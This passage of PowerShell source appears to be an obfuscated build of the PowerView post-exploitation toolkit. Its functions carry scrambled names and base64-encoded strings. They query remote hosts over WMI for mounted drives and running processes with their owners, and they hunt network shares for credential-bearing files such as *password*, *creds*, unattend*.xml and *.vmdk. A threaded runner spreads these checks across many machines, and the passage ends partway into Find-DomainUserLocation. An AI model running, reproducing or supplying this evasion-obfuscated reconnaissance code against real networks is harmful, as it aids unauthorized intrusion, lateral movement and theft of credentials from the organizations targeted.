                        ${__/=\_/=======\_/} = (${/=======\/\/=\_/=}.EnumKey(${/===\__/\_/\/=\/=}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AFwAXwBfAC8AXAAvAFwALwA9AFwALwBcAC8AXAB9AFwATgBlAHQAdwBvAHIAawA='))))).sNames
                        ForEach (${/==\/=\/\/===\_/\} in ${__/=\_/=======\_/}) {
                            ${/=\/===\_/\/\__/=} = ${/=======\/\/=\_/=}.GetStringValue(${/===\__/\_/\/=\/=}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AFwAXwBfAC8AXAAvAFwALwA9AFwALwBcAC8AXAB9AFwATgBlAHQAdwBvAHIAawBcACQAewAvAD0APQBcAC8APQBcAC8AXAAvAD0APQA9AFwAXwAvAFwAfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdgBpAGQAZQByAE4AYQBtAGUA')))).sValue
                            ${_/=\/\/\__/===\/=} = ${/=======\/\/=\_/=}.GetStringValue(${/===\__/\_/\/=\/=}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AFwAXwBfAC8AXAAvAFwALwA9AFwALwBcAC8AXAB9AFwATgBlAHQAdwBvAHIAawBcACQAewAvAD0APQBcAC8APQBcAC8AXAAvAD0APQA9AFwAXwAvAFwAfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUABhAHQAaAA=')))).sValue
                            ${_/\__/==\_/\/\/==} = ${/=======\/\/=\_/=}.GetStringValue(${/===\__/\_/\/=\/=}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AFwAXwBfAC8AXAAvAFwALwA9AFwALwBcAC8AXAB9AFwATgBlAHQAdwBvAHIAawBcACQAewAvAD0APQBcAC8APQBcAC8AXAAvAD0APQA9AFwAXwAvAFwAfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA==')))).sValue
                            if (-not ${/=\/=\_/\_/\/\_/\}) { ${/=\/=\_/\_/\/\_/\} = '' }
                            if (${_/=\/\/\__/===\/=} -and (${_/=\/\/\__/===\/=} -ne '')) {
                                ${/====\___/=\/===\} = New-Object PSObject
                                ${/====\___/=\/===\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${__/\__/\/\_/=====}
                                ${/====\___/=\/===\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${/=\/=\_/\_/\/\_/\}
                                ${/====\___/=\/===\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) ${/==\__/\/\/=\/\/\}
                                ${/====\___/=\/===\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAEwAZQB0AHQAZQByAA=='))) ${/==\/=\/\/===\_/\}
                                ${/====\___/=\/===\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdgBpAGQAZQByAE4AYQBtAGUA'))) ${/=\/===\_/\/\__/=}
                                ${/====\___/=\/===\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUABhAHQAaAA='))) ${_/=\/\/\__/===\/=}
                                ${/====\___/=\/===\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAFUAcwBlAHIATgBhAG0AZQA='))) ${_/\__/==\_/\/\/==}
                                ${/====\___/=\/===\}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBSAGUAZwBNAG8AdQBuAHQAZQBkAEQAcgBpAHYAZQA='))))
                                ${/====\___/=\/===\}
                            }
                        }
                    }
                    catch {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAE0AbwB1AG4AdABlAGQARAByAGkAdgBlAF0AIABFAHIAcgBvAHIAOgAgACQAXwA=')))
                    }
                }
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAE0AbwB1AG4AdABlAGQARAByAGkAdgBlAF0AIABFAHIAcgBvAHIAIABhAGMAYwBlAHMAcwBpAG4AZwAgACQAewBfAF8ALwBcAF8AXwAvAFwALwBcAF8ALwA9AD0APQA9AD0AfQAsACAAbABpAGsAZQBsAHkAIABpAG4AcwB1AGYAZgBpAGMAaQBlAG4AdAAgAHAAZQByAG0AaQBzAHMAaQBvAG4AcwAgAG8AcgAgAGYAaQByAGUAdwBhAGwAbAAgAHIAdQBsAGUAcwAgAG8AbgAgAGgAbwBzAHQAOgAgACQAXwA=')))
            }
        }
    }
}
function ___/\__/=\_/\/=\/\ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${____/=\/=\_/=\/\/} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach (${__/\__/\/\_/=====} in ${____/=\/=\_/=\/\/}) {
            try {
                ${/==\__/=\/\__/\__} = @{
                    'ComputerName' = ${____/=\/=\_/=\/\/}
                    'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAF8AcAByAG8AYwBlAHMAcwA=')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/==\__/=\/\__/\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                Get-WMIobject @/==\__/=\/\__/\__ | % {
                    ${___/\/=======\___} = $_.getowner();
                    ${_____/\/=\____/=\} = New-Object PSObject
                    ${_____/\/=\____/=\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${__/\__/\/\_/=====}
                    ${_____/\/=\____/=\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBOAGEAbQBlAA=='))) $_.ProcessName
                    ${_____/\/=\____/=\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQA'))) $_.ProcessID
                    ${_____/\/=\____/=\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) ${___/\/=======\___}.Domain
                    ${_____/\/=\____/=\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))) ${___/\/=======\___}.User
                    ${_____/\/=\____/=\}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAFAAcgBvAGMAZQBzAHMA'))))
                    ${_____/\/=\____/=\}
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFAAcgBvAGMAZQBzAHMAXQAgAEUAcgByAG8AcgAgAGUAbgB1AG0AZQByAGEAdABpAG4AZwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwBlAHMAIABvAG4AIAAnACQAewBfAF8ALwBcAF8AXwAvAFwALwBcAF8ALwA9AD0APQA9AD0AfQAnACwAIABhAGMAYwBlAHMAcwAgAGwAaQBrAGUAbAB5ACAAZABlAG4AaQBlAGQAOgAgACQAXwA=')))
            }
        }
    }
}
function _/\____/=\/\_/\__/ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBwAGEAcwBzAHcAbwByAGQAKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAGUAbgBzAGkAdABpAHYAZQAqAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBhAGQAbQBpAG4AKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBsAG8AZwBpAG4AKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAGUAYwByAGUAdAAqAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBuAGEAdAB0AGUAbgBkACoALgB4AG0AbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHYAbQBkAGsA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAHMAKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAGUAbgB0AGkAYQBsACoA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGMAbwBuAGYAaQBnAA==')))),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        ${_/==\/=\_/=\/=\/\/},
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        ${_/===\/=\__/=\___/},
        [Switch]
        ${___/=\____/==\__/\},
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${/=\___/=\__/=\/\/} =  @{
            'Recurse' = $True
            'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
            'Include' = $Include
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAaQBjAGUARABvAGMAcwA=')))]) {
            ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGMAbAB1AGQAZQA=')))] = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGQAbwBjAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGQAbwBjAHgA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHgAbABzAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHgAbABzAHgA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHAAcAB0AA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHAAcAB0AHgA'))))
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGUAcwBoAEUAWABFAHMA')))]) {
            $LastAccessTime = (Get-Date).AddDays(-7).ToString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBNAC8AZABkAC8AeQB5AHkAeQA='))))
            ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGMAbAB1AGQAZQA=')))] = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGUAeABlAA=='))))
        }
        ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAYwBlAA==')))] = -not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAbAB1AGQAZQBIAGkAZABkAGUAbgA=')))]
        ${_/\__/\/====\_/=\} = @{}
        function __/\/=\__/\/====== {
            [CmdletBinding()]Param([String]$Path)
            try {
                ${/====\_/=\_/=\_/\} = [IO.File]::OpenWrite($Path)
                ${/====\_/=\_/=\_/\}.Close()
                $True
            }
            catch {
                $False
            }
        }
    }
    PROCESS {
        ForEach (${/=\_/==\/===\____} in $Path) {
            if ((${/=\_/==\/===\____} -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                ${_/\____/=\_/====\} = (New-Object System.Uri(${/=\_/==\/===\____})).Host
                if (-not ${_/\__/\/====\_/=\}[${_/\____/=\_/====\}]) {
                    ___/=\_/\_/=\/\_/\ -____/=\/=\_/=\/\/ ${_/\____/=\_/====\} -Credential $Credential
                    ${_/\__/\/====\_/=\}[${_/\____/=\_/====\}] = $True
                }
            }
            ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA=')))] = ${/=\_/==\/===\____}
            ls @/=\___/=\__/=\/\/ | % {
                ${__/=\/\__/\/=\___} = $True
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAbAB1AGQAZQBGAG8AbABkAGUAcgBzAA==')))] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    ${__/=\/\__/\/=\___} = $False
                }
                if ($LastAccessTime -and ($_.LastAccessTime -lt $LastAccessTime)) {
                    ${__/=\/\__/\/=\___} = $False
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABXAHIAaQB0AGUAVABpAG0AZQA=')))] -and ($_.LastWriteTime -lt $LastWriteTime)) {
                    ${__/=\/\__/\/=\___} = $False
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGkAbwBuAFQAaQBtAGUA')))] -and ($_.CreationTime -lt $CreationTime)) {
                    ${__/=\/\__/\/=\___} = $False
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFcAcgBpAHQAZQBBAGMAYwBlAHMAcwA=')))] -and (-not (__/\/=\__/\/====== -Path $_.FullName))) {
                    ${__/=\/\__/\/=\___} = $False
                }
                if (${__/=\/\__/\/=\___}) {
                    ${_/==\/==\_/\/\/\_} = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    ${_/=\__/=\_/====\/} = New-Object -TypeName PSObject -Property ${_/==\/==\_/\/\/\_}
                    ${_/=\__/=\_/====\/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AdQBuAGQARgBpAGwAZQA='))))
                    ${_/=\__/=\_/====\/}
                }
            }
        }
    }
    END {
        ${_/\__/\/====\_/=\}.Keys | _______/\__/=\/=\/
    }
}
function _/=\__/=\__/=\/==\ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        ${____/=\/=\_/=\/\/},
        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        ${___/\/=\____/=\/\/},
        [Parameter(Position = 2)]
        [Hashtable]
        ${__/\/\/\/\____/\/\},
        [Int]
        [ValidateRange(1,  100)]
        $Threads = 20,
        [Switch]
        ${_/==\_/\/\___/==\_}
    )
    BEGIN {
        ${__/=\____/\_/\_/=} = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        ${__/=\____/\_/\_/=}.ApartmentState = [System.Threading.ApartmentState]::STA
        if (-not ${_/==\_/\/\___/==\_}) {
            ${_/\/\___/==\/\___} = gv -Scope 2
            ${/===\____/=\_/\/\} = @('?',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQByAGcAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AcwBvAGwAZQBGAGkAbABlAE4AYQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAaQBvAG4AQwBvAG4AdABlAHgAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBhAGwAcwBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABPAE0ARQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHAAdQB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0AE8AYgBqAGUAYwB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBBAGwAaQBhAHMAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBEAHIAaQB2AGUAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBFAHIAcgBvAHIAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBGAHUAbgBjAHQAaQBvAG4AQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBIAGkAcwB0AG8AcgB5AEMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBWAGEAcgBpAGEAYgBsAGUAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEkAbgB2AG8AYwBhAHQAaQBvAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB1AGwAbAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABJAEQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEIAbwB1AG4AZABQAGEAcgBhAG0AZQB0AGUAcgBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEMAbwBtAG0AYQBuAGQAUABhAHQAaAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEMAdQBsAHQAdQByAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEQAZQBmAGEAdQBsAHQAUABhAHIAYQBtAGUAdABlAHIAVgBhAGwAdQBlAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEgATwBNAEUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFMAYwByAGkAcAB0AFIAbwBvAHQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFUASQBDAHUAbAB0AHUAcgBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFYAZQByAHMAaQBvAG4AVABhAGIAbABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABXAEQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGUAbABsAEkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AG4AYwBoAHIAbwBuAGkAegBlAGQASABhAHMAaAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAZQA='))))
            ForEach (${/===\/===\_______} in ${_/\/\___/==\/\___}) {
                if (${/===\____/=\_/\/\} -NotContains ${/===\/===\_______}.Name) {
                ${__/=\____/\_/\_/=}.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList ${/===\/===\_______}.name,${/===\/===\_______}.Value,${/===\/===\_______}.description,${/===\/===\_______}.options,${/===\/===\_______}.attributes))
                }
            }
            ForEach (${_/\/====\_/=\/\__} in (ls Function:)) {
                ${__/=\____/\_/\_/=}.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList ${_/\/====\_/=\/\__}.Name, ${_/\/====\_/=\/\__}.Definition))
            }
        }
        ${__/\_/\__/==\_/=\} = [RunspaceFactory]::CreateRunspacePool(1, $Threads, ${__/=\____/\_/\_/=}, $Host)
        ${__/\_/\__/==\_/=\}.Open()
        $Method = $Null
        ForEach (${___/=\/\/\/\_/\_/} in [PowerShell].GetMethods() | ? { $_.Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBlAGcAaQBuAEkAbgB2AG8AawBlAA=='))) }) {
            ${_/\___/\/\__/\/==} = ${___/=\/\/\/\_/\_/}.GetParameters()
            if ((${_/\___/\/\__/\/==}.Count -eq 2) -and ${_/\___/\/\__/\/==}[0].Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHAAdQB0AA=='))) -and ${_/\___/\/\__/\/==}[1].Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwB1AHQAcAB1AHQA')))) {
                $Method = ${___/=\/\/\/\_/\_/}.MakeGenericMethod([Object], [Object])
                break
            }
        }
        ${___/\/\/=\/==\/=\} = @()
        ${____/=\/=\_/=\/\/} = ${____/=\/=\_/=\/\/} | ? {$_ -and $_.Trim()}
        Write-Verbose "[New-ThreadedFunction] Total number of hosts: $(${____/=\/=\_/=\/\/}.count)"
        if ($Threads -ge ${____/=\/=\_/=\/\/}.Length) {
            $Threads = ${____/=\/=\_/=\/\/}.Length
        }
        ${__/\/\_/=\_/\___/} = [Int](${____/=\/=\_/=\/\/}.Length/$Threads)
        ${______/==\___/=\/} = @()
        ${/=\_/\__/====\_/=} = 0
        ${__/===\___/=\_/==} = ${__/\/\_/=\_/\___/}
        for(${/==\__/===\__/\__} = 1; ${/==\__/===\__/\__} -le $Threads; ${/==\__/===\__/\__}++) {
            ${/==\_/\/\_/\/=\_/} = New-Object System.Collections.ArrayList
            if (${/==\__/===\__/\__} -eq $Threads) {
                ${__/===\___/=\_/==} = ${____/=\/=\_/=\/\/}.Length
            }
            ${/==\_/\/\_/\/=\_/}.AddRange(${____/=\/=\_/=\/\/}[${/=\_/\__/====\_/=}..(${__/===\___/=\_/==}-1)])
            ${/=\_/\__/====\_/=} += ${__/\/\_/=\_/\___/}
            ${__/===\___/=\_/==} += ${__/\/\_/=\_/\___/}
            ${______/==\___/=\/} += @(,@(${/==\_/\/\_/\/=\_/}.ToArray()))
        }
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAFQAaAByAGUAYQBkAGUAZABGAHUAbgBjAHQAaQBvAG4AXQAgAFQAbwB0AGEAbAAgAG4AdQBtAGIAZQByACAAbwBmACAAdABoAHIAZQBhAGQAcwAvAHAAYQByAHQAaQB0AGkAbwBuAHMAOgAgACQAVABoAHIAZQBhAGQAcwA=')))
        ForEach (${/==\__/\/===\/\__} in ${______/==\___/=\/}) {
            ${_/\/=\_/\/\__/=\_} = [PowerShell]::Create()
            ${_/\/=\_/\/\__/=\_}.runspacepool = ${__/\_/\__/==\_/=\}
            $Null = ${_/\/=\_/\/\__/=\_}.AddScript(${___/\/=\____/=\/\/}).AddParameter($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))), ${/==\__/\/===\/\__})
            if (${__/\/\/\/\____/\/\}) {
                ForEach (${__/=\/\__/===\/=\} in ${__/\/\/\/\____/\/\}.GetEnumerator()) {
                    $Null = ${_/\/=\_/\/\__/=\_}.AddParameter(${__/=\/\__/===\/=\}.Name, ${__/=\/\__/===\/=\}.Value)
                }
            }
            ${__/\/\/\_/\/\/=\/} = New-Object Management.Automation.PSDataCollection[Object]
            ${___/\/\/=\/==\/=\} += @{
                PS = ${_/\/=\_/\/\__/=\_}
                Output = ${__/\/\/\_/\/\/=\/}
                Result = $Method.Invoke(${_/\/=\_/\/\__/=\_}, @($Null, [Management.Automation.PSDataCollection[Object]]${__/\/\/\_/\/\/=\/}))
            }
        }
    }
    END {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAFQAaAByAGUAYQBkAGUAZABGAHUAbgBjAHQAaQBvAG4AXQAgAFQAaAByAGUAYQBkAHMAIABlAHgAZQBjAHUAdABpAG4AZwA=')))
        Do {
            ForEach (${_/==\/====\/\____} in ${___/\/\/=\/==\/=\}) {
                ${_/==\/====\/\____}.Output.ReadAll()
            }
            sleep -Seconds 1
        }
        While ((${___/\/\/=\/==\/=\} | ? { -not $_.Result.IsCompleted }).Count -gt 0)
        ${_/\___/\____/\/=\} = 100
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAFQAaAByAGUAYQBkAGUAZABGAHUAbgBjAHQAaQBvAG4AXQAgAFcAYQBpAHQAaQBuAGcAIAAkAHsAXwAvAFwAXwBfAF8ALwBcAF8AXwBfAF8ALwBcAC8APQBcAH0AIABzAGUAYwBvAG4AZABzACAAZgBvAHIAIABmAGkAbgBhAGwAIABjAGwAZQBhAG4AdQBwAC4ALgAuAA==')))
        for (${/==\__/===\__/\__}=0; ${/==\__/===\__/\__} -lt ${_/\___/\____/\/=\}; ${/==\__/===\__/\__}++) {
            ForEach (${_/==\/====\/\____} in ${___/\/\/=\/==\/=\}) {
                ${_/==\/====\/\____}.Output.ReadAll()
                ${_/==\/====\/\____}.PS.Dispose()
            }
            sleep -S 1
        }
        ${__/\_/\__/==\_/=\}.Dispose()
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAFQAaAByAGUAYQBkAGUAZABGAHUAbgBjAHQAaQBvAG4AXQAgAGEAbABsACAAdABoAHIAZQBhAGQAcwAgAGMAbwBtAHAAbABlAHQAZQBkAA==')))
    }
}
function Find-DomainUserLocation {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${____/=\/=\_/=\/\/},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [Alias('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,
        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
